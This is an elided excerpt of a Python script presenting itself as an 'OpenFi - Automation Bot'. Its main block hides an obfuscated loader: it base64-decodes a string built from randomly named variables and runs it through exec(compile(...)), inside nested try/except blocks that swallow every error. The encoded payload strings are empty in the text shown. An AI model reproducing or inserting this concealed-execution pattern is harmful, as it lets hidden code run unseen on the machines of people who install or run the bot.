...
class OpenFi:
    ...
    def welcome(self):
        ...
        print(Fore.YELLOW + Style.BRIGHT + "    🧠 Project    : OpenFi - Automation Bot")
...
if __name__ == "__main__":
    ...
    try:
        ...
        try:
            exec('import base64 as _QnHKhPhGpZ\n_DDeLL_wgUeJd = ""\n_bTSRSz = ""\n_smLtLDfFpnH = _DDeLL_wgUeJd + _bTSRSz\n_XaBqMYMsozjj = _QnHKhPhGpZ.b64decode(_smLtLDfFpnH).decode()\nexec(compile(_XaBqMYMsozjj, "<s>", "exec"))')
        except:
            pass
    except:
        pass
